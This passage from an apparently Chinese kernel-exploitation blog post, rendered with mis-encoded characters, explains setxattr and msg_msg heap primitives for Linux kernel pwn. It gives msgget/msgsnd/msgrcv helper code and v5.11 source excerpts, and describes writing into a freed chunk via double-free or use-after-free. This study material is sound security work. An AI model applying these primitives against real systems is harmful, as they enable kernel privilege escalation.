class="comment">//é‡Šæ”¾chunkï¼ŒåŸºæœ¬ç­‰äºkfreeå‡½æ•°</span></span><br><span class="line">	kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å…³æ³¨ç‚¹åœ¨<code>kvmalloc</code>ã€<code>copy_from_user</code>ã€<code>kvfree</code>ã€‚</p>
<p><code>kvmalloc</code>ä¸­çš„sizeå¯æ§ï¼Œ<code>copy_from_user</code>ä¸­çš„valueå¯æ§</p>
<p>ä¹Ÿå°±æ˜¯è¯´å½“<code>freelist</code>ä¸­å­˜åœ¨æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„chunkï¼Œè€Œè¯¥chunkåˆæ˜¯æˆ‘ä»¬æ§åˆ¶çš„æŸä¸ªè®¾å¤‡å†…å­˜å—æ—¶ï¼Œ(é€šè¿‡double-freeæˆ–è€…UAFå®ç°)é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>setxattr</code>æ¥å¯¹è¯¥è®¾å¤‡å†…å­˜è¿›è¡Œä»»æ„å†™ã€‚è™½ç„¶æœ€åä¼šé‡Šæ”¾ï¼Œä½†æ˜¯ä¹Ÿåªä¼šå½±å“å†…å­˜å—ä¸­å­˜æ”¾ä¸‹ä¸€ä¸ªchunkåœ°å€å¤„çš„å†…å®¹0x8ä¸ªå­—èŠ‚ï¼Œè€Œå½“æˆ‘ä»¬ç”¨ä¸ç€è¿™ä¸ªåœ°æ–¹çš„å†…å®¹æ—¶ï¼Œå°±ä¸ç”¨å¤ªå…³æ³¨äº†ã€‚</p>

        <h5 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h5>
      <p>ä½¿ç”¨çš„æ—¶å€™éœ€è¦æ³¨æ„æŒ‡å®šä¸€ä¸ªå½“å‰çš„expç¨‹åºï¼Œç±»ä¼¼å¦‚ä¸‹ï¼Œç¬¬äºŒä¸ªå‚æ•°å­—ç¬¦ä¸²ä»»æ„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/ufdExp&quot;</span>, <span class="string">&quot;PIG-007&quot;</span>, &amp;buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="msg-msg"   >
          <a href="#msg-msg" class="heading-link"><i class="fas fa-link"></i></a><a href="#msg-msg" class="headerlink" title="msg_msg"></a>msg_msg</h4>
      <p>è¿™ä¸ªä¸‹é¢æ–°åˆ›ä¸€ä¸ªç‚¹ï¼Œæ–¹ä¾¿æ ‡é¢˜è·³è½¬</p>

        <h2 id="3-msg-msg"   >
          <a href="#3-msg-msg" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-msg-msg" class="headerlink" title="3.msg_msg"></a>3.msg_msg</h2>
      <p>æ‰¿æ¥ä¸Šé¢çš„çŸ¥è¯†ç‚¹</p>
<p>è¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿæ€»ç»“è¿‡ï¼Œä¸è¿‡æ€»ç»“å¾—æœ‰äº›é”™è¯¯ï¼Œä¹Ÿä¸å¤ªå®Œå–„ï¼Œè¿™é‡Œå†å¥½å¥½æ€»ç»“ä¸€ä¸‹</p>
<p>ä¿®æ”¹æ—¶é—´ï¼š<code>2022-05-12</code></p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linuxå†…æ ¸ä¸­åˆ©ç”¨msg_msgç»“æ„å®ç°ä»»æ„åœ°å€è¯»å†™ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linuxçš„è¿›ç¨‹é—´é€šä¿¡ - æ¶ˆæ¯é˜Ÿåˆ— Â· Poor Zorroâ€™s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ã€ŠLinux/Unixç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º"   >
          <a href="#â‘ åˆ›å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <ul>
<li><p>é¦–å…ˆåˆ›å»º<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œå¯¹åº”äºå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//keyè¦ä¹ˆä½¿ç”¨ftok()ç®—æ³•ç”Ÿæˆ,è¦ä¹ˆæŒ‡å®šä¸ºIPC_PRIVATE</span></span><br><span class="line"><span class="comment">//ä»£è¡¨ç€è¯¥æ¶ˆæ¯é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­å”¯ä¸€çš„æ ‡è¯†ç¬¦</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨IPC_PRIVATEä¼šç”Ÿæˆå…¨æ–°çš„æ¶ˆæ¯é˜Ÿåˆ—IPCå¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ç®€å•å°è£…çš„<code>msgget</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å·<code>__NR_msgget</code>ï¼Œä¹‹åä¿å­˜æ•°æ®çš„æ¶ˆæ¯å°±ä¼šåœ¨è¿™ä¸ª<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œä»¥åŠå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„ä¸‹è¿›è¡Œåˆ›å»º</p>
</li>
</ul>

        <h4 id="â‘¡æ•°æ®ä¼ è¾“"   >
          <a href="#â‘¡æ•°æ®ä¼ è¾“" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ•°æ®ä¼ è¾“" class="headerlink" title="â‘¡æ•°æ®ä¼ è¾“"></a>â‘¡æ•°æ®ä¼ è¾“</h4>
      <ul>
<li><p>å†™å…¥æ¶ˆæ¯ï¼š</p>
<p>ç„¶åå°±å¯ä»¥ä¾æ®<code>queue_id</code>å†™å…¥æ¶ˆæ¯äº†ï¼Œä¸åŒäº<code>pipe</code>å’Œ<code>socketpair</code>ï¼Œè¿™ä¸ªéœ€è¦ç‰¹å®šçš„å°è£…å‡½æ•°ï¼ˆ<code>msgsnd/msgrcv</code>ï¼‰æˆ–è€…å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ<code>__NR_msgrcv/__NR_msgsnd</code>ï¼‰æ¥å®ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_bufå®é™…ä¸Šä¸ºmsgp,é‡Œé¢åŒ…å«mtype,è¿™ä¸ªmtypeåœ¨åé¢çš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>è¯»å–æ¶ˆæ¯ï¼š</p>
<p>ä¹‹åå³å¯ä¾æ®<code>queue_id</code>è¯»å–æ¶ˆæ¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
<p>å¯é€šè¿‡è®¾ç½®è¯¥å€¼æ¥å®ç°ä¸åŒé¡ºåºçš„æ¶ˆæ¯è¯»å–ï¼Œåœ¨ä¹‹åçš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</p>
<ul>
<li>åœ¨å†™å…¥æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>mtype</code>ï¼Œåç»­æ¥æ”¶æ¶ˆæ¯æ—¶å¯ä»¥ä¾æ®æ­¤<code>mtype</code>æ¥è¿›è¡Œéé¡ºåºæ¥æ”¶</li>
<li>åœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>msgtyp</code>ï¼Œåˆ†ä¸ºå¦‚ä¸‹æƒ…å†µ<ul>
<li><code>msgtyp</code>å¤§äº0ï¼šé‚£ä¹ˆåœ¨<code>find_msg</code>å‡½æ•°ä¸­ï¼Œå°±ä¼šå°†éå†å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€æ¡ç­‰äº<code>msgtyp</code>çš„æ¶ˆæ¯ï¼Œç„¶åè¿›è¡Œåç»­æ“ä½œã€‚</li>
<li><code>msgtyp</code>ç­‰äº0ï¼šå³ç±»ä¼¼äºé¡ºåºè¯»å–ï¼Œ<code>find_msg</code>å‡½æ•°ä¼šç›´æ¥è·å–åˆ°æ¶ˆæ¯é˜Ÿåˆ—é¦–ä¸ªæ¶ˆæ¯ã€‚</li>
<li><code>msgtyp</code>å°äº0ï¼šä¼šå°†ç­‰å¾…çš„æ¶ˆæ¯å½“æˆä¼˜å…ˆé˜Ÿåˆ—æ¥å¤„ç†ï¼Œ<code>mtype</code>çš„å€¼è¶Šå°ï¼Œå…¶ä¼˜å…ˆçº§è¶Šé«˜ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>å¯ä»¥å…³æ³¨ä¸€ä¸‹<code>MSG_NOERROR</code>æ ‡å¿—ä½ï¼Œæ¯”å¦‚è¯´<code>msg_flag</code>æ²¡æœ‰è®¾ç½®<code>MSG_NOERROR</code>çš„æ—¶å€™ï¼Œé‚£ä¹ˆæƒ…å†µå¦‚ä¸‹ï¼š</p>
<p>å‡å®šè·å–æ¶ˆæ¯æ—¶è¾“å…¥çš„é•¿åº¦<code>m_ts_size</code>ä¸º<code>0x200</code>ï¼Œä¸”è¿™ä¸ªé•¿åº¦å¤§äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™å¯ä»¥é¡ºåˆ©è¯»å–ï¼Œå¦‚æœè¯¥é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>ä½†æ˜¯å¦‚æœè®¾ç½®äº†<code>MSG_NOERROR</code>ï¼Œé‚£ä¹ˆå³ä½¿ä¼ å…¥æ¥æ”¶æ¶ˆæ¯çš„é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦ï¼Œä»ç„¶å¯ä»¥é¡ºåˆ©è·å–ï¼Œä½†æ˜¯å¤šä½™çš„æ¶ˆæ¯ä¼šè¢«æˆªæ–­ï¼Œç›¸å…³å†…å­˜è¿˜æ˜¯ä¼šè¢«é‡Šæ”¾ï¼Œè¿™ä¸ªåœ¨æºä»£ç ä¸­ä¹Ÿæœ‰æ‰€ä½“ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcvå‡½æ•°ä¸­</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>msg_flag</code>ï¼Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚</p>

        <h4 id="â‘¢é‡Šæ”¾"   >
          <a href="#â‘¢é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢é‡Šæ”¾" class="headerlink" title="â‘¢é‡Šæ”¾"></a>â‘¢é‡Šæ”¾</h4>
      <p>è¿™ä¸ªä¸»è¦æ˜¯ç”¨åˆ°<code>msgctl</code>å°è£…å‡½æ•°æˆ–è€…<code>__NR_msgctl</code>ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥é‡Šæ”¾æ‰æ‰€æœ‰çš„æ¶ˆæ¯ç»“æ„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„<code>msg_queue</code>çš„ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…¶ä¸­IPC_RMIDè¿™ä¸ªcmdå‘½ä»¤ä»£è¡¨é‡Šæ”¾æ‰è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„æ‰€æœ‰æ¶ˆæ¯,å„ç§å†…å­˜ç»“æ„ä½“ç­‰</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id),IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡ä¸€èˆ¬ä¹Ÿç”¨ä¸åˆ°ï¼Œå¯èƒ½æŸäº›åˆå¹¶objçš„æƒ…å†µèƒ½ç”¨åˆ°?</p>
<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>cmd</code>å‘½ä»¤ï¼Œå¸¸ç”¨æ¥è®¾ç½®å†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç»“æ„ä¸Šçš„ç›¸å…³æ•°æ®ï¼Œä¸è¿‡å¤šä»‹ç»äº†ã€‚</p>

        <h4 id="æ€»ç»“"   >
          <a href="#æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4>
      <p>æ€»ç»“ä¸€ä¸‹å¤§è‡´çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ›å»º-1"   >
          <a href="#â‘ åˆ›å»º-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-1" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      
        <h5 id="A-å†…å­˜ç”³è¯·"   >
          <a href="#A-å†…å­˜ç”³è¯·" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <ul>
<li><p>è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»º<code>msg_queue</code>ç»“æ„ä½“ï¼Œä½¿ç”¨<code>msgget</code>å‡½æ•°ï¼Œè°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨æœ€åçš„<code>newque()</code>å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä½¿ç”¨<code>kvmalloc()</code>ç”³è¯·å †å—ï¼Œå¤§å°ä¸º0x100ï¼Œå±äº<code>kmalloc-256</code>ï¼Œ(ä¸åŒç‰ˆæœ¬å¤§å°è²Œä¼¼ä¸åŒ)ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¿™ä¸ªæ‰æ˜¯å®é™…ç”³è¯·çš„å 